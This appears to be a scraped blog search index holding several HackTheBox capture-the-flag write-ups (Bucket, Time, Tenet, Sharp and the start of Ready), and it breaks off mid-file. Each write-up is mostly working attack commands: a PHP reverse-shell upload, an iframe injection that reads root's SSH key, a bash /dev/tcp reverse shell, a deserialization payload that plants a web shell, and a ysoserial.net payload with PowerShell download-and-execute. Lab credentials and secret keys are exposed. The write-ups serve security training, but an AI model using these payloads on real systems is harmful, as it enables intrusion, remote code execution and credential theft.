http://bucket.htb/Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernelWebPage on port 80Add bucket.htb to hosts. We can see the webpage:After checking the source, we should add s3.bucket.htb to hosts file and check that page.Checking the s3:gobusterGobuster finds two directories:Directory enumerations3.bucket.htb/healthWithout going into the details or checking the google, we can noteice something regarding dynamodbs3.bucket.htb/shellShell makes some kind of redirectionAWSCLIApparently there is a way to interact with AWS Buckets using “awscli” which can be installed with apt!Following “default” configuration will be used.luka@kali:~/htb/bucket$ aws configureAWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLEAWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEYDefault region name [None]: us-west-2Default output format [None]: jsonAfter configuration, i’ve checked what commands i can run.Listing of bucketsluka@kali:~/htb/bucket/lazys3$ aws s3 ls --endpoint-url http://s3.bucket.htb --no-sign-request2021-01-26 13:05:03 adserverAnother command that can be used is dynamodb (few screenshots above, we’ve seen that s3 and dynamodb services are running.)This is the main difference between s3 and dynamodb: S3 is an object store, designed for large binary unstructured data. It can store individual objects up to 5 TB. The objects are aggregated into buckets. A bucket is like a namespace or a database table, or, if you prefer a file system analogy, it is like a disk drive. Buckets are always located in a particular region. You can easily set up cross-region replication for faster local access or backups. However, generally it’s best if one region is the reference data source, because multi-master replication with S3 is not easy to set up. DynamoDB is a document database, or, if you like buzzwords, a NoSQL database. Although it can keep binary objects as well, it’s really designed for storing structured textual (JSON) data, supporting individual items up to 400 KB. DynamoDB stores items in tables, which can either be in a particular region or globally replicated. DynamoDB Global Tables supports multi-master replication, so clients can write into the same table or even the same item from multiple regions at the same time, with local access latency.Reference: https://serverless.pub/s3-or-dynamodb/luka@kali:~/htb/bucket/lazys3$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/ --no-sign-request{ &quot;TableNames&quot;: [ &quot;users&quot; ]}luka@kali:~/htb/bucket/lazys3$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/ --no-sign-request{ &quot;Items&quot;: [ { &quot;password&quot;: { &quot;S&quot;: &quot;Management@#1@#&quot; }, &quot;username&quot;: { &quot;S&quot;: &quot;Mgmt&quot; } }, { &quot;password&quot;: { &quot;S&quot;: &quot;Welcome123!&quot; }, &quot;username&quot;: { &quot;S&quot;: &quot;Cloudadm&quot; } }, { &quot;password&quot;: { &quot;S&quot;: &quot;n2vM-&amp;lt;_K_Q:.Aa2&quot; }, &quot;username&quot;: { &quot;S&quot;: &quot;Sysadm&quot; } } ], &quot;Count&quot;: 3, &quot;ScannedCount&quot;: 3, &quot;ConsumedCapacity&quot;: null}Few usernames and passwords were found, but they cannot be anywhere right now.ExploitationGetting shell onto S3We can upload to s3! So let’s upload PHP Reverse shell which we can execute on bucket.htbluka@kali:~/htb/bucket$ aws s3 cp indexl.php s3://adserver/indexl.php --endpoint-url http://s3.bucket.htb --no-sign-requestupload: ./index.php to s3://adserver/index.phpUpload was successfulluka@kali:~/htb/bucket$ aws s3 ls s3://adserver/ --endpoint-url http://s3.bucket.htb --no-sign-request PRE images/2021-01-26 13:35:04 5344 index.html2021-01-26 13:36:01 2397 index.phpAnd run it!curl http://bucket.htb/index.phpReverse shell was spawned:Finding SSH access as RoyAfter checking the /etc/passwd, there is one potential user with password &amp;gt; roy, and credentials found before =&amp;gt; “n2vM-&amp;lt;_K_Q:.Aa2” which worked for ssh.PRIVILEGE ESCALATIONLocal EnumerationThere is something else running locally on ports 8000 and 40951 (Port 4566 = 4566 dynamodb) as root! Port 40591 returns 404 so lets try port 8000According to the title, this might be interessting to us:Let’s set a tunnel (SSH local listener) on Kali:ssh -L 8888:127.0.0.1:8000 -q -C -N roy@10.10.10.212Unfortunately after checking the source code, this site doesn’t seem to do anything and it’s a static site.Adding alerts table to dynamodbChecking the index.php it seems like the script starts another dynamodb instance with TableName = alerts, etc.This here will get tricky.roy@bucket:/var/www/bucket-app$ cat index.php &amp;lt;?php require &#39;vendor/autoload.php&#39;; use Aws\\DynamoDb\\DynamoDbClient; if($_SERVER[&quot;REQUEST_METHOD&quot;]===&quot;POST&quot;) { if($_POST[&quot;action&quot;]===&quot;get_alerts&quot;) { date_default_timezone_set(&#39;America/New_York&#39;); $client = new DynamoDbClient([ &#39;profile&#39; =&amp;gt; &#39;default&#39;, &#39;region&#39; =&amp;gt; &#39;us-east-1&#39;, &#39;version&#39; =&amp;gt; &#39;latest&#39;, &#39;endpoint&#39; =&amp;gt; &#39;http://localhost:4566&#39; ]); $iterator = $client-&amp;gt;getIterator(&#39;Scan&#39;, array( &#39;TableName&#39; =&amp;gt; &#39;alerts&#39;, &#39;FilterExpression&#39; =&amp;gt; &quot;title = :title&quot;, &#39;ExpressionAttributeValues&#39; =&amp;gt; array(&quot;:title&quot;=&amp;gt;array(&quot;S&quot;=&amp;gt;&quot;Ransomware&quot;)), )); foreach ($iterator as $item) { $name=rand(1,10000).&#39;.html&#39;; file_put_contents(&#39;files/&#39;.$name,$item[&quot;data&quot;]); } passthru(&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf&quot;); } } else { ?&amp;gt; We have seen the users table on dynamodb and but no alerts table. We can see in th script above that that script produces a PDF file and does not sanitize any input.So let’s create the alerts table on s3:aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://s3.bucket.htbTable was created. this is the outputHTML/iframe injectionNow its time to put a row/item to the table, which is going to be read when running the script.aws dynamodb put-item --table-name alerts --item &#39;{&quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;},&quot;data&quot;: {&quot;S&quot;: &quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;iframe src=&#39;/root/.ssh/id_rsa&#39;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;}}&#39; --return-consumed-capacity TOTAL --endpoint-url http://s3.bucket.htbGetting privileged shellNow just call curl --data &quot;action=get_alerts&quot; http://localhost:8000/ and grab the results.pdf.Convert openssh private key to rsa private key and set the privileges to chmod 600.ssh-keygen -p -N &quot;&quot; -m pem -f id_rsa_opensshAnd connect using the private key." }, { "title": "(HTB) - Time", "url": "/posts/Time/", "categories": "HackTheBox, Linux", "tags": "Linux, Java, Deserialization, CVE-2019-14439, A08:2021-Software And Data Integrity Failures, Weak Permissions, CVE-2019-12814, A06:2021-Vulnerable And Outdated Components, CVE-2019-12384", "date": "2022-09-12 11:33:00 +0200", "snippet": "**Time is a very straightforward box, which just needs to be enumerated very precisely. It starts with Java CVE and ends with **ENUMERATIONNMAPLet’s start with NMAP scan:Nmap scan report for 10.10.10.214Host is up (0.034s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)| 256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)|_ 256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Online JSON parserService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelGOBUSTERGobuster actually didn’t found anything where i could connect to, without 403 redirectionWebsiteWebsite is running a java script beautifier:I’ve sent a request through Burp and found out something interesting.EXPLOITATIONAs mentionend, i’ve sent an initial request through burp and continued in repeater. Data can be any non-numeric value and it will raise an exceptionNow testing with different bracketsmode=2&amp;amp;data={123}Results in exception. A Java Exception(!)Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.ObjectNow there is a CVE for that: https://github.com/jas502n/CVE-2019-12384 including exploit which, if ran, would give us shell:PRIVILEGE ESCALATIONExploiting System TimerRoot executes writable script owned by pericles.pericles@time:/tmp$ ls -la /usr/bin/timer_backup.sh-rwxrw-rw- 1 pericles pericles 88 Jan 25 15:05 /usr/bin/timer_backup.shTo exploit that, simply echo reverse shell to /usr/bin/timer_backup.sh, set a listener and wait.echo &quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.22/4444 0&amp;gt;&amp;amp;1&#39;&quot; &amp;gt; /usr/bin/timer_backup.sh" }, { "title": "(HTB) - Tenet", "url": "/posts/Tenet/", "categories": "HackTheBox, Linux", "tags": "Linux, PHP, Race Condition, Wordpress, Deserialization, Sudo Exploitation, Source Code Review, Information Disclosure, Misconfiguration, Password Reuse", "date": "2022-09-12 11:33:00 +0200", "snippet": "Tenet is medium rated linux box. It’s all about deserialization and exploiting race condition on the system levelENUMERATIONNMAPNmap scan report for 10.10.10.223Host is up (0.036s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)| 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)|_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWEBSERVERWe have to add tenet.htb to hosts file! ;)Seems like Rest API ist activated.(http://tenet.htb/index.php/wp-json/wp/v2/users)Word scraping with CEWL to build a wordlistLet’s scrape the website to find possible passwords (it’s worth a try!)cewl http://tenet.htb -m 6 -w passes.txt… but it didn’t work however there is a hint on the websiteSource Code ReviewFile sator.php can be found on the root of the site, but we cannot read it. If we add .bakextension however http://10.10.10.223/sator.php.bak:In order to successfully exploit the above bug three conditions must be satisfied: The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a “POP chain”. All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes . The data passed to unserialized comes from a file, so a file with serialized data must be present on the server.Reference: https://notsosecure.com/remote-code-execution-via-php-unserialize/ExploiationDeserializationSo let’s give it a shot:http://10.10.10.223/sator.php?arepo=O:14:&quot;DatabaseExport&quot;:2:{s:9:&quot;user_file&quot;;s:10:&quot;shell3.txt&quot;;s:4:&quot;data&quot;;s:4:&quot;test&quot;;}File was succesfully written.Now let’s write a php file which accepts GET requests and executes system commands:http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:{s:9:%22user_file%22;s:10:%22shell5.php%22;s:4:%22data%22;s:30:%22%3C?php%20system($_GET[%27cmd%27]);%20?%3E%22;}… which has worked:We do have command execution:Let’s get a shell, by encoding simple reverse bash shell:Shell has been spawned:Privilege EscalationEnumerationWhile enumerating some credentials were found:www-data@tenet:/var/www/html/wordpress$ cat wp-config.php | grep &quot;DB_USER\\|DB_PASSWORD&quot;&amp;lt;ss$ cat wp-config.php | grep &quot;DB_USER\\|DB_PASSWORD&quot;define( &#39;DB_USER&#39;, &#39;neil&#39; );define( &#39;DB_PASSWORD&#39;, &#39;Opera2112&#39; );This credentials also work for SSH as neil.SUDOERSAfter logging in with neil user following entry was discovered after running sudo -lneil@tenet:~$ sudo -lMatching Defaults entries for neil on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:User neil may run the following commands on tenet: (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.shAfter checking the /usr/local/bin/enableSSH.sh script something became clear - we cannot write to the Path of the root, so it is not possible to exploit that so, this were my thoughts: there is to much code for such a simple task it could be a rabbit hole.The 1. though led to thinking it could be something like race condition so let’s try that..Exploiting a race conditionCreate a new keyEnter file in which to save the key (/home/neil/.ssh/id_rsa): ./id_rsaEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa.Your public key has been saved in ./id_rsa.pub.The key fingerprint is:SHA256:SEkHM+vYF1qsiY4vDjapEXQdQR/JC4g1L/xXTYyV+1E neil@tenetThe key&#39;s randomart image is:+---[RSA 2048]----+| ooo+Boo +o. || ...+ooX..oo E || . + o=.=. .. . ||. . o* B.. . . ||. o.B.S . . || ..o .. . ||o+. . ||ooo. ||..... |+----[SHA256]-----+We can see that everytime another file will be created.neil@tenet:/tmp$ echo $(mktemp -u /tmp/ssh-XXXXXXXX)/tmp/ssh-FVbr7xIXneil@tenet:/tmp$ echo $(mktemp -u /tmp/ssh-XXXXXXXX)/tmp/ssh-CxebKjykneil@tenet:/tmp$ echo $(mktemp -u /tmp/ssh-XXXXXXXX)/tmp/ssh-WPULDJQBneil@tenet:/tmp$ echo $(mktemp -u /tmp/ssh-XXXXXXXX)/tmp/ssh-lJEyrgOdSince there is little chance to guess it, let’s exploit that race condition.I wrote following script, which spawns 2 threads and it does that 100 times (i had to run the script 2 times )neil@tenet:/tmp/race$ cat race.sh #!/bin/bashfor i in {1..100}do sudo /usr/local/bin/enableSSH.sh &amp;amp; echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDycGKFZRwjVjHPmg5YoP/VmccRN9wwBqdr/BBX4IxsnmeuHsWplgTMuLWhDzDz5dONNiMNEqK80tnsX1/MT2MxfWG/LGzy9FgNChV9COPJbQpTgWidH771u/IOXJGJKu1neDGl6z90ojR1OXuTAPzhf7sloyxr2k221WMqtguGFrP0JWfr0UZojYLOaEA5bawQ+pJouv9AuqEETX4ZMI/9iyLA41DFMr521waxtALk0R0xxYlomHGC5jby/e5cP9vYURAW3POhTz/L07se2joqkJoHHHj9d6oudhGKSCBJwLpnKPj4+TCdXfd1BhiaLJB/aRmJOjXEsogW8WXvbKSH neil@tenet&quot; | tee /tmp/ssh-* &amp;amp;doneIt took lees than 200 iterations to inject the public key into temporary written file. Grep serve just to get rid of output (KSH belongs to the root key and “authorized” belongs to enableSSH.sh output.… and … root! :)" }, { "title": "Sharp", "url": "/posts/Sharp/", "categories": "HackTheBox, Windows", "tags": "Windows, .NET, .NET Remoting, WCFServer, Ysoserial.net, CVE Exploitation, CVE-2014-4149, Reversing, Misconfiguration, Public Vulnerabilities, PortableKanban, Anonymous/Guest Access, WCF, Deserialization", "date": "2022-09-12 11:33:00 +0200", "snippet": "Sharp is an interesting Windows box which has primarely to do with reversing an C# or .NET binary. Privilege Escalation is all about Windows Communication Foundation (WCF)ENUMERATIONNMAPLet’s start nmap scan:Nmap scan report for 10.10.10.219Host is up (0.035s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn?8888/tcp open sun-answerbook?1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port139-TCP:V=7.91%I=7%D=1/17%Time=6004A6D5%P=x86_64-pc-linux-gnu%r(GetSF:Request,5,&quot;\\x83\\0\\0\\x01\\x8f&quot;);Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsSMBEnumeration with SMBMAPSMB is open, so let’s enumerate SMB using smbmapluka@kali:~$ smbmap -H 10.10.10.219[+] IP: 10.10.10.219:445 Name: 10.10.10.219 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share dev NO ACCESS IPC$ NO ACCESS Remote IPC kanban READ ONLYENUMERATION with SMBClientAs we can read kanban share, let’s see what’s in it:smbclient //10.10.10.219/kanbanAparently there are quite a few files in there which aparently belong to PortableKanbanPortable Kanban - EnumerationJust by google “Portable Kanban” and concentrating on exploits this shows up: https://www.exploit-db.com/exploits/49409Script parses PortableKanban.pk3 and prints a password as seen below:EXPLOITATIONSMBluka@kali:~/htb/sharp$ smbmap -H 10.10.10.219 -u lars -p G123HHrth234gRG[+] IP: 10.10.10.219:445 Name: 10.10.10 219 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share dev READ ONLY IPC$ READ ONLY Remote IPC kanban NO ACCESSWe can login using lars’s user and found credentials.luka@kali:~/htb/sharp$ crackmapexec smb 10.10.10.219 -u lars -p G123HHrth234gRG -x whoamiSMB 10.10.10.219 445 SHARP [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)Reading the Dev shareOn the dev share we have some interesting files present. Reading the notes.txt gives us a hint what to look next.Privilege Escalation as larsDNSPY DecompilationLet’s decompile Client.exe with dnspy.We can decompile Server.exe as well!Now regarding .NET Remoting there is an article out there: https://parsiya.net/blog/2015-11-14-intro-to-.net-remoting-for-hackers/There is an exploit for .NET Remoting and github page provides some documentation and explanation regarding that: https://github.com/tyranid/ExploitRemotingService..NET Remoting ExploitationLet’s clone and build an exploitStart a HTTP Server on a specified port serving e.g. Powershell reverse shell ;).Let’s generate a .NET Payload using ysoserial.net.\\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c &quot;powershell -c IEX(new-object net.webclient).downloadstring(&#39;http://10.10.14.12:8000/sharp.ps1&#39;)&quot;… and run the exploit..\\ExploitRemotingService.exe -s --user=debug --pass=&quot;SharpApplicationDebugUserPassword123!&quot; tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAGIvYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuMTI6ODAwMC9zaGFycC5wczEnKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoLShell should pop as seen above.Privilege Escalation after lars #2We can notice that wcfserveris runningI’ve compressed the directory with wcfserver in C:\\Users\\lars\\Documents\\wcf with powershell’s compress-archive and uploaded it to my windows box using http-server-put (https://gist.github.com/mildred/67d22d7289ae8f16cae7)It runs with SYSTEM privileges but lars cannot write to file. The plan is like before to modify the client and execute code.This is Client portionI tried to compile it and run it remotely but it didn’t work. Lets add following line (with client.InvokePowerShell):using RemotingSample;using System;using System.ServiceModel;namespace Client { public class Client { public static void Main() { ChannelFactory&amp;lt;IWcfService&amp;gt; channelFactory = new ChannelFactory&amp;lt;IWcfService&amp;gt;( new NetTcpBinding(SecurityMode.Transport),&quot;net.tcp://localhost:8889/wcf/NewSecretWcfEndpoint&quot; ); IWcfService client = channelFactory.CreateChannel(); Console.WriteLine(client.GetDiskInfo()); Console.WriteLine(client.GetCpuInfo()); Console.WriteLine(client.GetRamInfo()); Console.WriteLine(client.InvokePowerShell(&quot;iex (new-object net.webclient).downloadstring(&#39;http://10.10.14.12:8000/sharp_system.ps1&#39;)&quot;)); } }}Shell as NT AUTHORITY / SYSTEM should open:" }, { "title": "Ready", "url": "/posts/Ready/", "categories": "HackTheBox, Linux", "tags": "Linux, GitLab, SSRF Exploitation, CVE-2018-19571, A06:2021-Vulnerable And Outdated Components, Public Vulnerabilities, Docker, CRLF Exploitation, CVE-2018-19585, Clear Text Credentials, Containers, CVE Exploitation, Misconfiguration", "date": "2022-09-12 11:33:00 +0200", "snippet": "Ready is an easy box based on linux. It starts with vulnerable Gitlab version and ends with escaping docker container.ENUMERATIONNMAPLet’s start nmap scan:luka@kali:~/htb/ready$ nmap -sC -sV -oN nmap 10.10.10.220Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-20 13:10 CETNmap scan report for 10.10.10.220Host is up (0.57s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)5080/tcp open http nginx| http-robots.txt: 53 disallowed entries (15 shown)| / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit| http-title: Sign in \\xC2\\xB7 GitLab|_Requested resource was http://10.10.10.220:5080/users/sign_in|_http-trane-info: Problem with XML parsing of /evox/aboutService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 288.63 secondsEnumerating GITLAB on port 5080Checking the webserver on port 5080 we can see that there’s Gitlab running.We can register and login:If we check the version, we can see that we’re running the version 11.4.7For which there’s a CVE which is very convenient with an exploit which is very convenient: https://www.exploit-db.com/exploits/49263 # Exploit Title: GitLab 11.4.7 Authenticated Remote Code Execution (No Interaction Required) # Date: 15th December 2020 # Exploit Author: Mohin Paramasivam (Shad0wQu35t) # Software Link: https://about.gitlab.com/ # POC: https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/ # Tested on: GitLab 11.4.7 CE # CVE : CVE-2018-19571 (SSRF),CVE-2018-19585 (CRLF)For exploit to work, we need to change gitlab_url in the code. Everything else will be taken from arguments.I also hardcoded Y at server prompt and option 1. I also hat to remove bytes &quot;b&quot; from payload.Shell was downloaded.Now hardcode option 2 and run the payload again (listener on port 8888).python3 exploit.py -U luka -P &#39;Pass_123!&quot;§&#39; -l 10.10.14.12 -p 8888Shell was spawned.PRIVILEGE ESCALATIONFinding low hanging fruits with git user.After getting on the system as git user secrets.yml was found!git@gitlab:~/gitlab-rails/etc$ cat secrets.yml cat secrets.yml # This file is managed by gitlab-ctl. Manual changes will be # erased! To change the contents below, edit /etc/gitlab/gitlab.rb # and run `sudo gitlab-ctl reconfigure`. --- production: db_key_base: eaa32eb7018961f9b101a330b8a905b771973ece8667634e289a0383c2ecff650bb4e7b1a6034c066af2f37ea3ee103227655c33bc17c123c99f421ee0776429 secret_key_base: b7c70c02d37e37b14572f5387919b00206d2916098e3c54147f9c762d6bef2788a82643d0c32ab1cdb315753d6a4e59271cddf9b41f37c814dd7d256b7a2f353 otp_key_base: b30e7b1e7e65c31d70385c47bc5bf48cbe774e39492280df7428ce6f66bc53ec494d2fbcbf9b49ec204b3ba741261b43cdaf7a191932f13df1f5bd6018458e56 openid_connect_signing_key: | -----BEGIN RSA PRIVATE KEY----- MIIJKAIBAAKCAgEA2l/m01GZYRj9Iv5A49uAULFBomOnHxHnQ5ZvpUPRj1fMovoC dQBdEPdcB+KmsHKbtv21Ycfe8fK2RQpTZPq75AjQ37x63S/lpVEnF7kxcAAf0mRw......Enumerating the system, finding a SMTP passwordRoot password was found:./opt/backup/gitlab.rb:476:gitlab_rails[&#39;smtp_password&#39;] = &quot;wW59U!ZKMbG9+*#h&quot;Are we in Docker??Let’s check if we are in Containercat /proc/1/cgroupObviously we are in privileged container. Let’s check the docker-compose.yml, mind the privileged: true.$ cat /opt/backup/docker-compose.ymlversion: &#39;2.4&#39;services: web: image: &#39;gitlab/gitlab-ce:11.4.7-ce.0&#39; restart: always hostname: &#39;gitlab.example.com&#39; environment: GITLAB_OMNIBUS_CONFIG: | external_url &#39;http://172.19.0.2&#39; redis[&#39;bind&#39;]=&#39;127.0.0.1&#39; redis[&#39;port&#39;]=6379 